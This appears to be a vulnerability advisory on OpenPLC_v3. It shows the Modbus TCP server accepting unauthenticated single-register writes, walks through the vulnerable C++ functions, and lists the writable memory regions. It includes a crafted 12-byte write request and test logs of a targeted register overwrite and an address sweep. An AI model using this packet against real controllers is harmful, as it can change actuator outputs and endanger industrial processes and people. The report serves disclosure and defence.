# Talos Vulnerability Report

## OpenPLC OpenPLC_v3 ModbusTCP server unrestricted single register write vulnerability

##### CVE Number

[Pending]

##### SUMMARY

An unrestricted write vulnerability exists in the ModbusTCP server functionality of OpenPLC _v3. The `WriteRegister()` function accepts FC=06 (Write Single Register) requests from any unauthenticated network client without access control on the target register address or value. A specially crafted 12-byte Modbus TCP request can overwrite any holding register (addresses 0–8191) across four distinct PLC memory regions, including analog output registers that directly drive physical actuators. An unauthenticated attacker can send a single network request to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable.

OpenPLC _v3 master branch (all versions using `webserver/core/modbus.cpp`)

##### PRODUCT URLS

OpenPLC_v3 - [https://github.com/thiagoralves/OpenPLC_v3](https://github.com/thiagoralves/OpenPLC_v3)

##### CWE

CWE-306 - Missing Authentication for Critical Function

##### DETAILS

OpenPLC is an open-source programmable logic controller (PLC) designed to provide a low cost option for automation. The platform consists of two parts: the Runtime and the Editor. The Runtime can be deployed on a variety of platforms including Windows, Linux, and various microcontrollers. Common uses for OpenPLC include home automation and industrial security research. OpenPLC supports communication across a variety of protocols, including Modbus and EtherNet/IP.

An unrestricted write condition exists in OpenPLC's handling of Modbus Function Code 06 (Write Single Register). The server accepts FC=06 requests from any network client without authentication, authorization, or access control. FC=06 is notable because its 12-byte request is the smallest possible Modbus write message, making it harder to distinguish from legitimate single-register SCADA operations (e.g., operator setpoint changes) in network traffic analysis.

When a Modbus TCP client connects to port 502, `startServer()` accepts the connection and spawns a handler thread. The handler calls `processMessage()` ([1]), which dispatches to `processModbusMessage()`:

```
void processMessage(unsigned char *buffer, int bufferSize, int client_fd, int protocol_type)
{
    int messageSize = 0;
    if (protocol_type == MODBUS_PROTOCOL)
    {
        messageSize = processModbusMessage(buffer, bufferSize);  // [1]
    }
    while (messageSize > 0)
    {
        ssize_t bytesWritten = write(client_fd, buffer, messageSize);
        // ...
    }
}
```

Inside `processModbusMessage()`, the function code is dispatched with no authentication check ([2]):

```
int processModbusMessage(unsigned char *buffer, int bufferSize)
{
    MessageLength = 0;
    // ...

    else if(buffer[7] == MB_FC_WRITE_REGISTER)  // FC=06 (0x06)
    {
        WriteRegister(buffer, bufferSize);       // [2] no auth check
    }
    // ...
}
```

The `WriteRegister()` function extracts the Register Address from `buffer[8..9]` ([3]) and the Register Value from `buffer[10..11]` ([4]), then passes both directly to `writeToRegisterWithoutLocking()`:

```
void WriteRegister(unsigned char *buffer, int bufferSize)
{
    int Start;
    int mb_error = ERR_NONE;

    if (bufferSize < 12)
    {
        ModbusError(buffer, ERR_ILLEGAL_DATA_VALUE);
        return;
    }

    Start = word(buffer[8], buffer[9]);          // [3] attacker-controlled
    
    pthread_mutex_lock(&bufferLock);
    mb_error = writeToRegisterWithoutLocking(     // [4] direct write, no auth
        Start,
        word(buffer[10], buffer[11])
    );
    pthread_mutex_unlock(&bufferLock);

    if (mb_error != ERR_NONE)
    {
        ModbusError(buffer, mb_error);
    }
    else
    {
        buffer[4] = 0;
        buffer[5] = 6;
        MessageLength = 12;                       // [5] echo request as confirmation
    }
}
```

The `writeToRegisterWithoutLocking()` function maps the register address to one of four PLC memory regions ([6]–[9]):

```
int writeToRegisterWithoutLocking(int position, uint16_t value)
{
    if (position < MIN_16B_RANGE)    // addresses 0–1023 → analog outputs
    {
        if (int_output[position] != NULL)
            *int_output[position] = value;  // [6] direct write to PHYSICAL OUTPUT
    }
    else if (position >= MIN_16B_RANGE && position <= MAX_16B_RANGE)  // 1024–2047
    {
        if (int_memory[position - MIN_16B_RANGE] != NULL)
            *int_memory[position - MIN_16B_RANGE] = value;  // [7] 16-bit internal memory
    }
    else if (position >= MIN_32B_RANGE && position <= MAX_32B_RANGE)  // 2048–4095
    {
        int bit_offset = (1 - ((position - MIN_32B_RANGE) % 2)) * 16;
        *dint_memory[(position - MIN_32B_RANGE) / 2] &= ~(((uint32_t) 0xffff) << bit_offset);
        *dint_memory[(position - MIN_32B_RANGE) / 2] |= ((uint32_t) value) << bit_offset;  // [8]
    }
    else if (position >= MIN_64B_RANGE && position <= MAX_64B_RANGE)  // 4096–8191
    {
        int bit_offset = (3 - ((position - MIN_64B_RANGE) % 4)) * 16;
        *lint_memory[(position - MIN_64B_RANGE) / 4] &= ~(((uint64_t) 0xffff) << bit_offset);
        *lint_memory[(position - MIN_64B_RANGE) / 4] |= ((uint64_t) value) << bit_offset;  // [9]
    }
    else
    {
        return ERR_ILLEGAL_DATA_ADDRESS;
    }
    return ERR_NONE;
}
```

At no point in this chain is any authentication, authorization, or access control check performed. The four memory regions accessible via FC=06 are:

| Address Range | Memory Target | IEC 61131-3 | Physical Meaning |
|--------------|--------------|-------------|------------------|
| 0–1023 | `int_output[]` | `%QW` | Directly drives physical actuators |
| 1024–2047 | `int_memory[]` | `%MW` | Internal PLC state |
| 2048–4095 | `dint_memory[]` | `%MD` | 32-bit integers |
| 4096–8191 | `lint_memory[]` | `%ML` | 64-bit integers |

FC=06 and FC=16 share the same vulnerable sink function (`writeToRegisterWithoutLocking()`), but FC=06 has a distinct code path through `WriteRegister()` with its own entry point, size validation, and response handling. FC=06's 12-byte packet is the smallest possible Modbus write and closely mimics legitimate single-register SCADA operations.

Knowing this, it is possible to overwrite any holding register by sending a single 12-byte request. The following request overwrites register `0x0064` with value `0x07D0` (decimal 2000):

```
00 01 00 00 00 06 01 06 00 64 07 D0
```

The server responds with an identical 12-byte echo, confirming the write succeeded with no authentication.

To verify the vulnerability, a test environment was set up with OpenPLC v3 running in a Docker container (debian:trixie) with holding registers at `%QW0`–`%QW3`. A Python script sent FC=06 requests and verified results via FC=03 read-back.

**Precision attack** — overwrite register 0x0064 while sentinels are unchanged:

```
Pre-attack state:
  reg[99]  (0x0063) = 1111   ← sentinel
  reg[100] (0x0064) =  600   ← target register
  reg[101] (0x0065) = 3333   ← sentinel

TX: 00 03 00 00 00 06 01 06 00 64 07 D0   ← FC=06, addr=0x0064, value=2000
RX: 00 03 00 00 00 06 01 06 00 64 07 D0   ← echo (write confirmed)

Post-attack state:
  reg[99]  (0x0063) = 1111   ← UNCHANGED
  reg[100] (0x0064) = 2000   ← OVERWRITTEN (600 → 2000)
  reg[101] (0x0065) = 3333   ← UNCHANGED
```

**Address space sweep** — five addresses tested:

```
Address 0x0000 (dec 0):   written=500, read-back=500  ✓
Address 0x0032 (dec 50):  written=600, read-back=600  ✓
Address 0x0064 (dec 100): written=700, read-back=700  ✓
Address 0x00C8 (dec 200): written=800, read-back=800  ✓
Address 0x01F4 (dec 500): written=999, read-back=999  ✓
```

All five addresses are writable without authentication via FC=06, confirming the entire holding register address space is unprotected.
